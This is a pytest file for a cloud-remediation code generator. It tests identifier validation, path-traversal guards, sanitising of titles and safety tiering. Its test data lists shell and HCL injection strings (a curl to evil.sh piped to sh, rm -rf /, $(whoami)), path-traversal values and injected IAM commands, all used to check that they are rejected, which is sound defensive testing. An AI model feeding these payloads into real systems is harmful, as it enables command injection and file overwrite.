"""Tests for the core model: validation, safety tiering, and the guards.

These are the tests that matter most. The model is what stops untrusted finding
data from reaching generated infrastructure code, and it is what stops a recipe
author from mislabelling a dangerous change as safe.
"""

from __future__ import annotations

import pytest

from remgen.core.model import (
    MAX_TEXT_LENGTH,
    ApiCall,
    CostImpact,
    Effort,
    Finding,
    HclTarget,
    Policy,
    Recipe,
    SafetyTier,
    UnsafeIdentifierError,
    collapse_whitespace,
    to_hcl_label,
    validate_identifier,
    validate_path_segment,
)

# ---------------------------------------------------------------------------
# Identifier validation
# ---------------------------------------------------------------------------

#: Values that must never reach a generated artifact. Each is a real injection
#: shape for either bash or HCL.
UNSAFE_VALUES = [
    "bucket; rm -rf /",
    "bucket && curl evil.sh | sh",
    "$(whoami)",
    "`whoami`",
    "${HOME}",
    'bucket"\nresource "aws_iam_policy" "x" {',
    "bucket\nrm -rf /",
    "bucket\r\nmalicious",
    "bucket'--",
    'bucket"',
    "bucket\\escape",
    "bucket|tee /etc/passwd",
    "bucket>out",
    "bucket<in",
    "bucket*glob",
    "bucket?q",
    "bucket!bang",
    "bucket#comment",
    "bucket%s",
    "bucket\x00null",
    "bucket\ttab",
    "-leading-dash",
    "",
    "x" * 1025,
]


@pytest.mark.parametrize("value", UNSAFE_VALUES)
def test_unsafe_identifiers_are_rejected(value):
    with pytest.raises(UnsafeIdentifierError):
        validate_identifier(value, field_name="resource_id")


@pytest.mark.parametrize(
    "value",
    [
        "my-bucket",
        "my.bucket.example",
        "MyTable_1",
        "arn:aws:cloudtrail:us-east-1:123456789012:trail/my-trail",
        "1234abcd-12ab-34cd-56ef-1234567890ab",
        "key/with/slashes",
        "tag=value",
        "user+plus@example.com",
        "name with spaces",
        "x" * 1024,
    ],
)
def test_legitimate_aws_identifiers_are_accepted(value):
    assert validate_identifier(value, field_name="resource_id") == value


def test_validate_identifier_rejects_non_strings():
    for value in (None, 123, [], {}):
        with pytest.raises(UnsafeIdentifierError):
            validate_identifier(value, field_name="resource_id")


# ---------------------------------------------------------------------------
# Path segments: the values that become filenames
#
# `validate_identifier` permits '/', which it must -- S3 keys and Azure resource
# IDs contain them. But `OutputUnit.filename` interpolates account_id and region
# into a filename, so for those two the identifier rule is not the right rule.
# It was the rule, and the gap was exploitable: see the test below.
# ---------------------------------------------------------------------------

#: Values that must never be accepted where the value becomes a path component.
#: The first four are traversal; the rest are separators or shapes that would
#: make a filename mean something other than it reads as.
UNSAFE_PATH_SEGMENTS = [
    "1/../../../../tmp/pwned",
    "..",
    "1/..",
    "../sibling",
    "a/b",
    "/absolute",
    "trailing/",
    "has.dot",
    "-leading-dash",
    "",
    "x" * 129,
]


@pytest.mark.parametrize("value", UNSAFE_PATH_SEGMENTS)
def test_values_that_become_filenames_reject_separators_and_traversal(value):
    with pytest.raises(UnsafeIdentifierError):
        validate_path_segment(value, field_name="account_id")


@pytest.mark.parametrize(
    "value",
    [
        "111111111111",  # AWS account id
        "00000000-0000-0000-0000-000000000000",  # Azure subscription id
        "us-east-1",  # AWS region
        "eastus",  # Azure location
        "my_scope-1",
    ],
)
def test_every_real_cloud_scope_and_region_is_a_valid_path_segment(value):
    # The stricter rule has to reject malformed input without constraining any
    # real cloud's vocabulary -- otherwise it is not a fix, it is an outage.
    assert validate_path_segment(value, field_name="account_id") == value


def test_a_hostile_account_id_cannot_write_outside_the_output_directory(tmp_path):
    """Regression: this exact input wrote two artifacts outside ``--out``.

    ``account_id`` arrives from the findings export and is interpolated into
    ``OutputUnit.filename``. Under ``validate_identifier`` alone -- which permits
    ``/`` -- an ``account_id`` of ``1/../../../../tmp/trav/target/PWNED`` produced
    ``aws/remediate-aws-1/../../../../tmp/.../PWNED-us-east-1.tf``, and both the
    ``.sh`` and the ``.tf`` were written to the traversal target while ``--out``
    held only ``README.md`` and ``manifest.json``. Confirmed by running the real
    CLI, not by reasoning about the regex.

    Asserted at the ``Finding`` boundary because that is where the untrusted
    value enters: rejecting it there means no generator, layout rule or future
    output format has to remember the hazard. ``cmd_generate`` also re-checks
    every resolved path before writing, so this is defence in depth rather than
    a single gate.
    """
    outside = tmp_path / "target"
    outside.mkdir()
    with pytest.raises(UnsafeIdentifierError) as exc:
        Finding(
            policy_id="284b1210-a31e-48ce-97af-f4d825ef132d",
            resource_id="mybucket",
            region="us-east-1",
            account_id=f"1/../../../..{outside}/PWNED",
        )
    # The message has to name the field and say why, or the next person to see it
    # will assume a legitimate id was rejected and loosen the rule.
    assert "account_id" in str(exc.value)
    assert not list(outside.iterdir()), "nothing may have been written"


def test_a_hostile_region_is_rejected_too():
    # region is the other component interpolated into the filename. Tested
    # separately because a fix applied to only one of the two would leave the
    # vulnerability reachable while this file looked like it covered it.
    with pytest.raises(UnsafeIdentifierError):
        Finding(
            policy_id="284b1210-a31e-48ce-97af-f4d825ef132d",
            resource_id="mybucket",
            region="../../etc",
            account_id="111111111111",
        )


def test_finding_validates_every_field():
    with pytest.raises(UnsafeIdentifierError):
        Finding(policy_id="p", resource_id="ok", region="us-east-1; evil", account_id="1")
    with pytest.raises(UnsafeIdentifierError):
        Finding(policy_id="p", resource_id="ok", region="us-east-1", account_id="$(x)")
    with pytest.raises(UnsafeIdentifierError):
        Finding(
            policy_id="p",
            resource_id="ok",
            region="us-east-1",
            account_id="1",
            resource_name="bad`name`",
        )


# ---------------------------------------------------------------------------
# HCL labels
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("my-bucket", "my-bucket"),
        ("my.bucket", "my_bucket"),
        ("arn:aws:s3:::bucket/key", "arn_aws_s3_bucket_key"),
        ("123table", "r_123table"),
        ("UPPER", "upper"),
        ("a..b", "a_b"),
        ("...", "resource"),
        # Path-shaped ids (every Azure resource ID) reduce to the last segment.
        # Folding the whole thing gave a 131-character label whose only
        # distinguishing part was at the very end.
        (
            "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg"
            "/providers/Microsoft.Storage/storageAccounts/mystorageacct",
            "mystorageacct",
        ),
        ("/subscriptions/x/resourceGroups/rg/", "rg"),
        ("/", "resource"),
    ],
)
def test_to_hcl_label(value, expected):
    assert to_hcl_label(value) == expected


def test_shortening_path_shaped_labels_cannot_change_an_aws_label():
    """The shortening branch must be unreachable for AWS-shaped identifiers.

    This is the property that makes the change safe to land in shared code: a
    leading ``/`` was rejected by ``validate_identifier`` before path-shaped ids
    were permitted, so nothing that was previously *valid* can take the new
    branch. Asserted rather than argued, because "no AWS output changed" is
    exactly the claim a reviewer cannot check by reading.
    """
    aws_shapes = [
        "my-bucket",
        "arn:aws:cloudtrail:us-east-1:123456789012:trail/my-trail",
        "GameScores",
        "key/with/slashes",
        "1234abcd-12ab-34cd-56ef-1234567890ab",
    ]
    for value in aws_shapes:
        assert not value.startswith("/"), f"{value!r} would take the new branch"
        # Folding directly is what the old implementation did; the result must
        # be identical for every one of these.
        assert to_hcl_label(value) == to_hcl_label(value.lstrip("/"))


def test_hcl_labels_are_valid_hcl_identifiers():
    import re

    for value in ("arn:aws:s3:::b/k", "1x", "a.b.c", "UPPER-case"):
        label = to_hcl_label(value)
        assert re.fullmatch(r"[A-Za-z_][A-Za-z0-9_-]*", label), label


# ---------------------------------------------------------------------------
# Free-form text sanitisation
# ---------------------------------------------------------------------------


def test_collapse_whitespace_strips_newlines():
    # A newline in a policy title would escape the comment it is rendered in.
    assert collapse_whitespace("a\nb") == "a b"
    assert collapse_whitespace("a\r\n\tb  c") == "a b c"
    assert collapse_whitespace("  padded  ") == "padded"


def test_policy_title_is_sanitised():
    policy = Policy(policy_id="p", title="Bad\ntitle", category="C\nat")
    assert "\n" not in policy.title
    assert "\n" not in policy.category


def test_collapse_whitespace_strips_control_characters():
    # An ANSI escape in a title can rewrite the terminal, so the reader cannot
    # trust what they are shown.
    out = collapse_whitespace("Bad\x1b[31mred\x00\x07")
    assert "\x1b" not in out
    assert "\x00" not in out
    assert "\x07" not in out
    assert "31mred" in out  # the text survives; only the escape byte is dropped


def test_collapse_whitespace_bounds_length():
    # An unbounded title floods the terminal and every generated comment.
    out = collapse_whitespace("A" * 5000)
    assert len(out) == MAX_TEXT_LENGTH
    assert out.endswith("...")


def test_collapse_whitespace_leaves_normal_text_intact():
    # The cap must not truncate a realistic title.
    title = "Ensure S3 buckets have versioning enabled (CIS AWS Foundations 2.1.3)"
    assert collapse_whitespace(title) == title


def test_policy_title_is_bounded():
    policy = Policy(policy_id="p", title="T" * 5000, category="C" * 5000)
    assert len(policy.title) <= MAX_TEXT_LENGTH
    assert len(policy.category) <= MAX_TEXT_LENGTH


@pytest.mark.parametrize(
    "title",
    [
        "Bad\n\naws iam create-user --user-name pwned\n#",
        "Bad\r\nrm -rf /",
        'Bad*/\n} resource "aws_iam_user" "pwned" {\n  name = "x"\n}\n#',
        "Bad\x1b[2J\x1b[H cleared your screen",
        "Bad\x00\x07bell",
    ],
)
def test_policy_title_cannot_escape_a_single_line(title):
    # The property that matters: whatever the catalog contains, a title occupies
    # exactly one line and carries no terminal control sequences. Anything else
    # lets catalog text escape the comment it is rendered inside.
    policy = Policy(policy_id="p", title=title)
    assert "\n" not in policy.title
    assert "\r" not in policy.title
    assert not any(ord(ch) < 32 for ch in policy.title)


def test_policy_requires_id():
    with pytest.raises(ValueError, match="policy_id"):
        Policy(policy_id="", title="x")


# ---------------------------------------------------------------------------
# Recipe invariants
# ---------------------------------------------------------------------------


def _api() -> ApiCall:
    return ApiCall(service="s3", operation="PutBucketVersioning", parameters=("Bucket",))


def _recipe(**overrides) -> Recipe:
    kwargs = {
        "policy_id": "p1",
        "policy_title": "Title",
        "summary": "Summary",
        "api": _api(),
        "cli_template": "aws s3api do-thing --bucket {resource_id}",
        "hcl": None,
        "reverse_hint": "undo it",
    }
    kwargs.update(overrides)
    return Recipe(**kwargs)


def test_recipe_requires_resource_id_in_template():
    # A command without {resource_id} would target the wrong thing, or everything.
    with pytest.raises(ValueError, match="resource_id"):
        _recipe(cli_template="aws s3api do-thing --bucket hardcoded")


def test_recipe_requires_policy_id():
    with pytest.raises(ValueError, match="policy_id"):
        _recipe(policy_id="")


def test_reversible_recipe_must_explain_how_to_reverse():
    with pytest.raises(ValueError, match="reverse_hint"):
        _recipe(reversible=True, reverse_hint="")


def test_api_call_requires_parameters():
    with pytest.raises(ValueError, match="parameters"):
        ApiCall(service="s3", operation="Op", parameters=())
    with pytest.raises(ValueError, match="service and operation"):
        ApiCall(service="", operation="Op", parameters=("A",))


# ---------------------------------------------------------------------------
# Safety tiering -- derived, so it cannot be mislabelled
# ---------------------------------------------------------------------------


def test_safest_requires_all_safe_properties():
    assert _recipe().safety_tier is SafetyTier.SAFEST


@pytest.mark.parametrize(
    "overrides",
    [
        {"reversible": False, "reverse_hint": ""},
        {"cost_impact": CostImpact.USAGE_SCALED},
        {"blocks_iac_destroy": True},
    ],
)
def test_commitment_downgrades_to_caution(overrides):
    assert _recipe(**overrides).safety_tier is SafetyTier.CAUTION


@pytest.mark.parametrize(
    "overrides",
    [
        {"data_path_impact": True},
        {"effort": Effort.MEDIUM},
        {"effort": Effort.REPLACEMENT},
    ],
)
def test_availability_risk_downgrades_to_disruptive(overrides):
    assert _recipe(**overrides).safety_tier is SafetyTier.DISRUPTIVE


def test_rank_orders_the_tiers_from_least_to_most_risky():
    """``rank`` is the one ordering of the tiers, and two callers rely on it.

    The CLI sorts remediations and the withheld-count breakdown by it, so a reader
    meets the safe changes first; the HCL generator uses it to file a merged block
    under the riskiest of its contributors' tiers. An inverted or flattened ordering
    puts a ``caution`` change under a ``SAFEST`` banner, which is the single thing the
    tiering exists to prevent -- and it would not fail any assertion about *which*
    tier a recipe derives, because the derivation is unaffected.

    Asserted on the ordering rather than on the literal numbers: the values are an
    implementation detail, being strictly increasing is the contract.
    """
    tiers = [SafetyTier.SAFEST, SafetyTier.CAUTION, SafetyTier.DISRUPTIVE]
    ranks = [t.rank for t in tiers]
    assert ranks == sorted(ranks), f"tiers are not ordered least-to-most risky: {ranks}"
    assert len(set(ranks)) == len(tiers), (
        f"two tiers share a rank, so `max` between them is arbitrary: {ranks}"
    )
    # Every member, so adding a tier without a rank fails here rather than at runtime
    # on the one merged block that happens to carry it.
    assert set(tiers) == set(SafetyTier), "a SafetyTier member is missing from this test"
    assert max(tiers, key=lambda t: t.rank) is SafetyTier.DISRUPTIVE
    assert min(tiers, key=lambda t: t.rank) is SafetyTier.SAFEST


def test_disruptive_wins_over_caution():
    # Worst property must dominate; a dangerous change must not be softened by
    # also being reversible.
    recipe = _recipe(data_path_impact=True, blocks_iac_destroy=True)
    assert recipe.safety_tier is SafetyTier.DISRUPTIVE


def test_safety_notes_describe_each_risk():
    recipe = _recipe(
        reversible=False,
        reverse_hint="",
        data_path_impact=True,
        cost_impact=CostImpact.USAGE_SCALED,
        blocks_iac_destroy=True,
        effort=Effort.REPLACEMENT,
    )
    joined = " ".join(recipe.safety_notes)
    assert "NOT REVERSIBLE" in joined
    assert "AFFECTS LIVE TRAFFIC" in joined
    assert "COST SCALES WITH USAGE" in joined
    assert "destroy" in joined
    assert "REPLACEMENT" in joined


def test_reversible_recipe_notes_how_to_reverse():
    assert any("undo it" in n for n in _recipe().safety_notes)


# ---------------------------------------------------------------------------
# HclTarget guards
# ---------------------------------------------------------------------------


def test_hcl_attribute_rejects_literal_braces():
    # Literal braces would be parsed as str.format placeholders at render time.
    with pytest.raises(ValueError, match="braces"):
        HclTarget(
            resource_type="aws_thing",
            attributes=(("block", '{ status = "Enabled" }'),),
            import_id_template="{resource_id}",
        )


def test_hcl_attribute_allows_known_placeholders():
    target = HclTarget(
        resource_type="aws_thing",
        attributes=(("bucket", '"{resource_id}"'), ("region", '"{region}"')),
        import_id_template="{resource_id}",
    )
    assert target.is_complete


def test_is_complete_reflects_unresolvable_requirements():
    with_attr = HclTarget(
        resource_type="aws_thing",
        attributes=(),
        import_id_template="{resource_id}",
        unresolvable_required_attributes=(("engine", '"postgres"', "TODO: set it"),),
    )
    assert not with_attr.is_complete
    assert with_attr.unresolvable_names == ("engine",)

    with_block = HclTarget(
        resource_type="aws_thing",
        attributes=(),
        import_id_template="{resource_id}",
        unresolvable_required_blocks=("attribute",),
    )
    assert not with_block.is_complete
    assert with_block.unresolvable_names == ("attribute",)
